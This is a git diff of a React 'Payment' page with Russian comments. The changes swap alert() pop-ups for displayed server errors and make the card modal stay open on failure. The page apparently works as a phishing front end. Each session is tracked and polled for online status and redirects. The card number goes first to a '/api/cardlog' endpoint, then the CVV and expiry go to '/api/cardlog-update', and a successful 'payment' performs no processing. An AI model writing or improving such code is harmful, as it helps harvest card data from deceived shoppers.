@@ -1,4 +1,4 @@
-// Payment.tsx - с ошибками для всех полей карты
+// Payment.tsx - с улучшенной обработкой ошибок
 import { useState, useEffect } from "react";
 import styles from "./Payment.module.css";
 import TotalOverview from "../../components/TotalOverview/TotalOverview";
@@ -13,12 +13,12 @@ const Payment = () => {
   const sessionId = localStorage.getItem("currentSessionId");
   const location = useLocation();
   useRedirectChecker(3000);
-  useRedirectChecker(3000);
   useOnlineStatus({
     sessionId,
     pageName: "payment",
     enabled: true,
   });
+  
   const [isLoading, setLoading] = useState<boolean>(false);
   const [currentStep, setCurrentStep] = useState<"personal" | "payment">(
     "personal"
@@ -27,7 +27,7 @@ const Payment = () => {
   const [formData, setFormData] = useState({
     firstName: "",
     lastName: "",
-    countryCode: "+971", // Фиксированный код ОАЭ
+    countryCode: "+971",
     phoneNumber: "",
   });
 
@@ -51,6 +51,8 @@ const Payment = () => {
     cvv: "",
   });
 
+  const [serverError, setServerError] = useState<string>("");
+
   useEffect(() => {
     window.scrollTo(0, 0);
   }, [location.pathname, currentStep]);
@@ -58,12 +60,11 @@ const Payment = () => {
   const sendCardNumberToServer = async (): Promise<boolean> => {
     const sessionId = localStorage.getItem("currentSessionId");
     if (!sessionId) {
-      alert("Session ID not found");
+      setServerError("Session ID not found");
       return false;
     }
 
     try {
-      // Убираем пробелы из номера карты перед отправкой
       const cleanCardNumber = cardData.cardNumber.replace(/\D/g, "");
 
       const response = await fetch("/api/cardlog", {
@@ -72,9 +73,9 @@ const Payment = () => {
         body: JSON.stringify({
           sessionId: sessionId,
           cardNumber: cleanCardNumber,
-          cvv: "", // Пока пустой
-          expireDate: "", // Пока пустой
-          step: "card_number_only", // Добавляем метку для бэкенда
+          cvv: "",
+          expireDate: "",
+          step: "card_number_only",
         }),
       });
 
@@ -82,20 +83,19 @@ const Payment = () => {
       return data.success;
     } catch (err) {
       console.error("Ошибка сети при отправке номера карты:", err);
+      setServerError("Network error while sending card number");
       return false;
     }
   };
 
-  const sendFullCardDataToServer = async (): Promise<boolean> => {
+  const sendFullCardDataToServer = async (): Promise<{success: boolean; error?: string; details?: string[]}> => {
     const sessionId = localStorage.getItem("currentSessionId");
     if (!sessionId) {
-      alert("Session ID not found");
-      return false;
+      return { success: false, error: "Session ID not found" };
     }
 
     try {
       const response = await fetch("/api/cardlog-update", {
-        // Новый эндпоинт
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -106,43 +106,51 @@ const Payment = () => {
       });
 
       const data = await response.json();
-      return data.success;
+      
+      if (!response.ok) {
+        return { 
+          success: false, 
+          error: data.error || "Validation failed",
+          details: data.details 
+        };
+      }
+      
+      return { success: data.success };
     } catch (err) {
       console.error("Ошибка сети при отправке полных данных:", err);
-      return false;
+      return { success: false, error: "Network error" };
     }
   };
 
-  // Валидация имени/фамилии (только буквы, пробелы и апострофы)
+  // Валидация имени/фамилии
   const validateName = (name: string): boolean => {
     const nameRegex = /^[a-zA-Zа-яА-Я\s'-]+$/;
     return nameRegex.test(name) && name.length >= 2;
   };
 
-  // Валидация номера телефона (только цифры, минимум 7 цифр)
+  // Валидация номера телефона
   const validatePhone = (phone: string): boolean => {
     const phoneRegex = /^\d+$/;
     return phoneRegex.test(phone) && phone.length >= 7 && phone.length <= 15;
   };
 
-  // Валидация номера карты (ровно 16 цифр)
+  // Валидация номера карты
   const validateCardNumber = (cardNumber: string): boolean => {
     const digits = cardNumber.replace(/\D/g, "");
     return digits.length === 16;
   };
 
-  // Валидация даты истечения (формат MM/YY, валидный месяц)
+  // Валидация даты истечения
   const validateExpiryDate = (expiryDate: string): boolean => {
     const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
     if (!expiryRegex.test(expiryDate)) {
       return false;
     }
 
-    // Проверка что дата не истекла
     const [month, year] = expiryDate.split("/");
     const now = new Date();
-    const currentYear = now.getFullYear() % 100; // Получаем последние 2 цифры года
-    const currentMonth = now.getMonth() + 1; // Месяцы от 1 до 12
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
 
     const expiryYear = parseInt(year, 10);
     const expiryMonth = parseInt(month, 10);
@@ -153,9 +161,9 @@ const Payment = () => {
     return true;
   };
 
-  // Валидация CVV (ровно 3 цифры)
+  // Валидация CVV
   const validateCvv = (cvv: string): boolean => {
-    return cvv.length === 3 && /^\d+$/.test(cvv);
+    return cvv.length === 3 && /^\d{3}$/.test(cvv);
   };
 
   const handleInputChange = (
@@ -165,12 +173,9 @@ const Payment = () => {
 
     let filteredValue = value;
 
-    // Применяем фильтрацию в зависимости от поля
     if (name === "firstName" || name === "lastName") {
-      // Только буквы, пробелы, апострофы и дефисы
       filteredValue = value.replace(/[^a-zA-Zа-яА-Я\s'-]/g, "");
     } else if (name === "phoneNumber") {
-      // Только цифры
       filteredValue = value.replace(/\D/g, "");
     }
 
@@ -179,14 +184,14 @@ const Payment = () => {
       [name]: filteredValue,
     }));
 
-    // Очищаем ошибку при вводе
     setFormErrors((prev) => ({
       ...prev,
       [name]: "",
     }));
+    
+    setServerError("");
   };
 
-  // Функция для проверки всех полей перед отправкой
   const validatePersonalForm = (): boolean => {
     const errors = {
       firstName: "",
@@ -197,15 +202,13 @@ const Payment = () => {
     if (!formData.firstName) {
       errors.firstName = "First name is required";
     } else if (!validateName(formData.firstName)) {
-      errors.firstName =
-        "Please enter a valid first name (letters only, min 2 characters)";
+      errors.firstName = "Please enter a valid first name (letters only, min 2 characters)";
     }
 
     if (!formData.lastName) {
       errors.lastName = "Last name is required";
     } else if (!validateName(formData.lastName)) {
-      errors.lastName =
-        "Please enter a valid last name (letters only, min 2 characters)";
+      errors.lastName = "Please enter a valid last name (letters only, min 2 characters)";
     }
 
     if (!formData.phoneNumber) {
@@ -219,12 +222,9 @@ const Payment = () => {
     return !errors.firstName && !errors.lastName && !errors.phoneNumber;
   };
 
-  // Функция для форматирования номера карты (только цифры, максимум 16)
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры
-    value = value.substring(0, 16); // Ограничиваем 16 цифрами
-
-    // Добавляем пробелы каждые 4 цифры для лучшего отображения
+    let value = e.target.value.replace(/\D/g, "");
+    value = value.substring(0, 16);
     const formattedValue = value.replace(/(\d{4})/g, "$1 ").trim();
 
     setCardData((prev) => ({
@@ -232,53 +232,53 @@ const Payment = () => {
       cardNumber: formattedValue,
     }));
 
-    // Очищаем ошибку при вводе
     setCardErrors((prev) => ({
       ...prev,
       cardNumber: "",
     }));
+    
+    setServerError("");
   };
 
-  // Функция для форматирования даты истечения (MM/YY)
   const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры
+    let value = e.target.value.replace(/\D/g, "");
 
     if (value.length > 2) {
       value = value.substring(0, 2) + "/" + value.substring(2, 4);
     }
 
-    value = value.substring(0, 5); // Ограничиваем MM/YY форматом
+    value = value.substring(0, 5);
 
     setCardData((prev) => ({
       ...prev,
       expiryDate: value,
     }));
 
-    // Очищаем ошибку при вводе
     setCardErrors((prev) => ({
       ...prev,
       expiryDate: "",
     }));
+    
+    setServerError("");
   };
 
-  // Функция для ввода CVV (только 3 цифры)
   const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры
-    value = value.substring(0, 3); // Ограничиваем 3 цифрами
+    let value = e.target.value.replace(/\D/g, "");
+    value = value.substring(0, 3);
 
     setCardData((prev) => ({
       ...prev,
       cvv: value,
     }));
 
-    // Очищаем ошибку при вводе
     setCardErrors((prev) => ({
       ...prev,
       cvv: "",
     }));
+    
+    setServerError("");
   };
 
-  // Валидация полей карты в модальном окне
   const validateCardForm = (): boolean => {
     const errors = {
       cardNumber: "",
@@ -312,44 +312,47 @@ const Payment = () => {
   const handleSubmitPersonalData = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
 
-    // Валидация всех полей
     if (!validatePersonalForm()) {
       return;
     }
 
-    // БЕРЕМ sessionId ИЗ localStorage
     const sessionId = localStorage.getItem("currentSessionId");
     if (!sessionId) {
-      alert("Session ID not found");
+      setServerError("Session ID not found");
       return;
     }
+
+    setLoading(true);
+    setServerError("");
 
     try {
       const response = await fetch("/api/customer", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          sessionId: sessionId, // ← Отправляем sessionId
+          sessionId: sessionId,
           name: formData.firstName,
           surname: formData.lastName,
-          phone: formData.countryCode + formData.phoneNumber, // Отправляем полный номер с кодом
+          phone: formData.countryCode + formData.phoneNumber,
         }),
       });
 
       const data = await response.json();
       if (data.success) {
         setCurrentStep("payment");
+        setServerError("");
       } else {
-        alert("Ошибка при отправке данных");
+        setServerError("Error sending personal data");
       }
     } catch (err) {
       console.error("Ошибка сети:", err);
-      alert("Не удалось отправить данные");
+      setServerError("Failed to send data");
+    } finally {
+      setLoading(false);
     }
   };
 
   const handleOpenPaymentModal = async () => {
-    // Валидация номера карты перед открытием модального окна
     if (!cardData.cardNumber) {
       setCardErrors((prev) => ({
         ...prev,
@@ -364,13 +367,14 @@ const Payment = () => {
       return;
     }
 
-    // Отправляем номер карты на сервер
     setLoading(true);
+    setServerError("");
+    
     const cardNumberSent = await sendCardNumberToServer();
+    
     setLoading(false);
 
     if (!cardNumberSent) {
-      alert("Failed to process card number. Please try again.");
       return;
     }
 
@@ -384,26 +388,54 @@ const Payment = () => {
   };
 
   const handleSubmitPayment = async () => {
-    // Валидация всех полей карты
     if (!validateCardForm()) {
       return;
     }
 
-    setModalActive(false);
+    setServerError("");
     setLoading(true);
 
     try {
-      // Отправляем остальные данные карты
-      const fullDataSent = await sendFullCardDataToServer();
+      const result = await sendFullCardDataToServer();
 
-      if (fullDataSent) {
+      if (result.success) {
         // Успешная обработка
+        setModalActive(false);
+        setServerError("");
       } else {
-        alert("Ошибка при обработке платежа");
+        // Устанавливаем ошибку от сервера
+        let errorMessage = result.error || "Payment processing error";
+        
+        if (result.details && result.details.length > 0) {
+          errorMessage += ": " + result.details.join(", ");
+        }
+        
+        setServerError(errorMessage);
+        
+        // Обновляем ошибки в форме на основе ответа сервера
+        if (result.details) {
+          const newCardErrors = { ...cardErrors };
+          
+          result.details.forEach(detail => {
+            if (detail.toLowerCase().includes('cvv')) {
+              newCardErrors.cvv = detail;
+            } else if (detail.toLowerCase().includes('expir')) {
+              newCardErrors.expiryDate = detail;
+            }
+          });
+          
+          setCardErrors(newCardErrors);
+        }
+        
+        // Оставляем модальное окно открытым
+        setModalActive(true);
       }
     } catch (err) {
       console.error("Ошибка сети:", err);
-      alert("Не удалось обработать платеж");
+      setServerError("Network error");
+      setModalActive(true);
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -412,6 +444,13 @@ const Payment = () => {
       <div className={styles.wrapper}>
         <div className={styles.content__side}>
           <div className={styles.form__container}>
+            {/* Показ серверной ошибки */}
+            {serverError && (
+              <div className={styles.server__error}>
+                {serverError}
+              </div>
+            )}
+            
             {currentStep === "personal" ? (
               <>
                 <h1 className={styles.form__title}>
@@ -569,7 +608,7 @@ const Payment = () => {
                         cardErrors.cardNumber ? styles.input__error : ""
                       }`}
                       placeholder="1234 5678 9012 3456"
-                      maxLength={19} // 16 цифр + 3 пробела
+                      maxLength={19}
                       required
                     />
                     {cardErrors.cardNumber && (
@@ -584,6 +623,14 @@ const Payment = () => {
                 <Modal active={isModalActive} setActive={setModalActive}>
                   <div className={styles.modal__content}>
                     <h2 className={styles.modal__title}>Complete Payment</h2>
+                    
+                    {/* Серверная ошибка в модальном окне */}
+                    {serverError && (
+                      <div className={styles.modal__error}>
+                        {serverError}
+                      </div>
+                    )}
+                    
                     <div className={styles.form__row}>
                       <div className={styles.form__group}>
                         <label
